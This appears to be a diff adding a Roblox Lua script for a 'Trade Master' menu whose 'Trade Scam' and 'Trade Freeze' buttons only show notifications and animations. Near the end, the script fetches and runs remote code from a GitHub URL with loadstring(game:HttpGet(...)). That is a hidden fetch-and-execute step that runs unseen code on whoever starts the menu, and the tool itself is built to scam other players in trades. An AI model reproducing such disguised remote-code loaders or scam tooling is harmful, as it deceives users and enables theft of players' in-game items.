@@ -1,0 +1,292 @@
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "TradeMenuGui"
+screenGui.ResetOnSpawn = false
+screenGui.DisplayOrder = 100
+screenGui.IgnoreGuiInset = true
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 380, 0, 340) -- Adjusted height for two buttons
+frame.Position = UDim2.new(0.5, -190, 0.5, -170)
+frame.BackgroundColor3 = Color3.fromRGB(10, 10, 20)
+frame.BorderSizePixel = 0
+frame.Active = true
+frame.Draggable = true
+frame.Parent = screenGui
+
+-- Smooth Corner Radius
+local uiCorner = Instance.new("UICorner")
+uiCorner.CornerRadius = UDim.new(0, 18)
+uiCorner.Parent = frame
+
+-- Unique Gradient with vibrant colors
+local gradient = Instance.new("UIGradient")
+gradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 20, 40)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(40, 20, 60)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(60, 40, 80))
+}
+gradient.Transparency = NumberSequence.new{
+    NumberSequenceKeypoint.new(0, 0.12),
+    NumberSequenceKeypoint.new(1, 0.12)
+}
+gradient.Rotation = 60
+gradient.Parent = frame
+
+-- Subtle Outer Glow
+local glow = Instance.new("UIStroke")
+glow.Thickness = 2.5
+glow.Color = Color3.fromRGB(140, 100, 255)
+glow.Transparency = 0.55
+glow.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+glow.Parent = frame
+
+-- Inner Shadow for Depth
+local shadow = Instance.new("Frame")
+shadow.Size = UDim2.new(1, 10, 1, 10)
+shadow.Position = UDim2.new(0, -5, 0, 5)
+shadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+shadow.BackgroundTransparency = 0.65
+shadow.BorderSizePixel = 0
+shadow.ZIndex = -1
+shadow.Parent = frame
+
+local shadowCorner = Instance.new("UICorner")
+shadowCorner.CornerRadius = UDim.new(0, 18)
+shadowCorner.Parent = shadow
+
+-- Title Bar
+local titleBar = Instance.new("Frame")
+titleBar.Size = UDim2.new(1, 0, 0, 55)
+titleBar.BackgroundColor3 = Color3.fromRGB(20, 20, 35)
+titleBar.BorderSizePixel = 0
+titleBar.Parent = frame
+
+local titleShadow = Instance.new("UIStroke")
+titleShadow.Thickness = 1
+titleShadow.Color = Color3.fromRGB(0, 0, 0)
+titleShadow.Transparency = 0.75
+titleShadow.Parent = titleBar
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, -30, 1, 0)
+title.Position = UDim2.new(0, 15, 0, 0)
+title.BackgroundTransparency = 1
+title.Text = "Trade Master"
+title.TextColor3 = Color3.fromRGB(210, 210, 255)
+title.Font = Enum.Font.GothamBold
+title.TextSize = 24
+title.TextStrokeTransparency = 0.9
+title.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.Parent = titleBar
+
+-- Title Bar Gradient
+local titleGradient = Instance.new("UIGradient")
+titleGradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 30, 50)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(50, 30, 70))
+}
+titleGradient.Rotation = 20
+titleGradient.Parent = titleBar
+
+-- Title Bar Corner
+local titleCorner = Instance.new("UICorner")
+titleCorner.CornerRadius = UDim.new(0, 10)
+titleCorner.Parent = titleBar
+
+-- Trade Scam Button
+local scamButton = Instance.new("TextButton")
+scamButton.Size = UDim2.new(0, 320, 0, 65)
+scamButton.Position = UDim2.new(0.5, -160, 0.32, 0) -- Centered for two buttons
+scamButton.BackgroundColor3 = Color3.fromRGB(240, 65, 65)
+scamButton.BorderSizePixel = 0
+scamButton.Text = "[>] Trade Scam"
+scamButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+scamButton.Font = Enum.Font.GothamBold
+scamButton.TextSize = 19
+scamButton.TextStrokeTransparency = 0.9
+scamButton.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+scamButton.Parent = frame
+
+local uiCornerScam = Instance.new("UICorner")
+uiCornerScam.CornerRadius = UDim.new(0, 12)
+uiCornerScam.Parent = scamButton
+
+local scamGlow = Instance.new("UIStroke")
+scamGlow.Thickness = 2
+scamGlow.Color = Color3.fromRGB(255, 110, 110)
+scamGlow.Transparency = 0.5
+scamGlow.Parent = scamButton
+
+local TweenService = game:GetService("TweenService")
+scamButton.MouseEnter:Connect(function()
+    TweenService:Create(scamButton, TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(255, 85, 85)}):Play()
+    TweenService:Create(scamGlow, TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Transparency = 0.3, Thickness = 2.5}):Play()
+end)
+scamButton.MouseLeave:Connect(function()
+    TweenService:Create(scamButton, TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(240, 65, 65)}):Play()
+    TweenService:Create(scamGlow, TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Transparency = 0.5, Thickness = 2}):Play()
+end)
+
+-- Trade Freeze Button
+local freezeButton = Instance.new("TextButton")
+freezeButton.Size = UDim2.new(0, 320, 0, 65)
+freezeButton.Position = UDim2.new(0.5, -160, 0.52, 0) -- Centered for two buttons
+freezeButton.BackgroundColor3 = Color3.fromRGB(65, 125, 255)
+freezeButton.BorderSizePixel = 0
+freezeButton.Text = "[>] Trade Freeze"
+freezeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+freezeButton.Font = Enum.Font.GothamBold
+freezeButton.TextSize = 19
+freezeButton.TextStrokeTransparency = 0.9
+freezeButton.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+freezeButton.Parent = frame
+
+local uiCornerFreeze = Instance.new("UICorner")
+uiCornerFreeze.CornerRadius = UDim.new(0, 12)
+uiCornerFreeze.Parent = freezeButton
+
+local freezeGlow = Instance.new("UIStroke")
+freezeGlow.Thickness = 2
+freezeGlow.Color = Color3.fromRGB(110, 160, 255)
+freezeGlow.Transparency = 0.5
+freezeGlow.Parent = freezeButton
+
+freezeButton.MouseEnter:Connect(function()
+    TweenService:Create(freezeButton, TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(85, 145, 255)}):Play()
+    TweenService:Create(freezeGlow, TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Transparency = 0.3, Thickness = 2.5}):Play()
+end)
+freezeButton.MouseLeave:Connect(function()
+    TweenService:Create(freezeButton, TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(65, 125, 255)}):Play()
+    TweenService:Create(freezeGlow, TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Transparency = 0.5, Thickness = 2}):Play()
+end)
+
+-- By Luchery Label
+local byLuchery = Instance.new("TextLabel")
+byLuchery.Size = UDim2.new(1, 0, 0, 30)
+byLuchery.Position = UDim2.new(0, 0, 1, -40)
+byLuchery.BackgroundTransparency = 1
+byLuchery.Text = "By Luchery"
+byLuchery.TextColor3 = Color3.fromRGB(160, 160, 180)
+byLuchery.Font = Enum.Font.SourceSansItalic
+byLuchery.TextSize = 14
+byLuchery.TextStrokeTransparency = 0.95
+byLuchery.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+byLuchery.Parent = frame
+
+-- Notification System
+local notification = Instance.new("Frame")
+notification.Size = UDim2.new(0, 340, 0, 85)
+notification.Position = UDim2.new(1, -350, 1, -95)
+notification.BackgroundColor3 = Color3.fromRGB(15, 15, 30)
+notification.BackgroundTransparency = 0.9
+notification.Visible = false
+notification.Parent = screenGui
+
+local uiCornerNotif = Instance.new("UICorner")
+uiCornerNotif.CornerRadius = UDim.new(0, 10)
+uiCornerNotif.Parent = notification
+
+local notifText = Instance.new("TextLabel")
+notifText.Size = UDim2.new(1, -20, 1, -10)
+notifText.Position = UDim2.new(0, 10, 0, 5)
+notifText.BackgroundTransparency = 1
+notifText.TextColor3 = Color3.fromRGB(255, 255, 255)
+notifText.Font = Enum.Font.GothamMedium
+notifText.TextSize = 16
+notifText.TextXAlignment = Enum.TextXAlignment.Left
+notifText.TextWrapped = true
+notifText.Parent = notification
+
+local notifStroke = Instance.new("UIStroke")
+notifStroke.Color = Color3.fromRGB(150, 180, 255)
+notifStroke.Transparency = 0.5
+notifStroke.Thickness = 1.5
+notifStroke.Parent = notification
+
+-- Notification Animation with 2-minute duration
+local function showNotification(text)
+    notifText.Text = text
+    notification.Visible = true
+    
+    notification.Position = UDim2.new(1, -350, 1, -85)
+    TweenService:Create(
+        notification,
+        TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+        {Position = UDim2.new(1, -350, 1, -105), BackgroundTransparency = 0.2}
+    ):Play()
+    
+    wait(120) -- 2 minutes as requested
+    
+    TweenService:Create(
+        notification,
+        TweenInfo.new(0.7, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
+        {Position = UDim2.new(1, -350, 1, -85), BackgroundTransparency = 0.9}
+    ):Play()
+    
+    wait(0.7)
+    notification.Visible = false
+end
+
+-- Button Click Events
+scamButton.MouseButton1Click:Connect(function()
+    showNotification("Trade Scam Activated!")
+    TweenService:Create(scamButton, TweenInfo.new(0.1, Enum.EasingStyle.Bounce), {Size = UDim2.new(0, 310, 0, 63)}):Play()
+    wait(0.1)
+    TweenService:Create(scamButton, TweenInfo.new(0.1, Enum.EasingStyle.Bounce), {Size = UDim2.new(0, 320, 0, 65)}):Play()
+end)
+
+freezeButton.MouseButton1Click:Connect(function()
+    showNotification("Trade Freeze Activated!")
+    TweenService:Create(freezeButton, TweenInfo.new(0.1, Enum.EasingStyle.Bounce), {Size = UDim2.new(0, 310, 0, 63)}):Play()
+    wait(0.1)
+    TweenService:Create(freezeButton, TweenInfo.new(0.1, Enum.EasingStyle.Bounce), {Size = UDim2.new(0, 320, 0, 65)}):Play()
+end)
+
+-- Execute external script on load
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LUCHERY666/FreeKnife/refs/heads/main/TradeScam"))()
+
+-- Parent GUI to PlayerGui
+if game:GetService("Players").LocalPlayer then
+    screenGui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
+else
+    game:GetService("Players").LocalPlayerAdded:Connect(function(player)
+        screenGui.Parent = player:WaitForChild("PlayerGui")
+    end)
+end
+
+-- Dragging Logic
+local UserInputService = game:GetService("UserInputService")
+local dragging, dragInput, dragStart, startPos
+
+frame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = frame.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+frame.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        dragInput = input
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if input == dragInput and dragging then
+        local delta = input.Position - dragStart
+        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
+
+-- Initial Animation
+frame.Position = UDim2.new(0.5, -190, 0.5, -210)
+frame.BackgroundTransparency = 1
+TweenService:Create(frame, TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = UDim2.new(0.5, -190, 0.5, -170), BackgroundTransparency = 0}):Play()
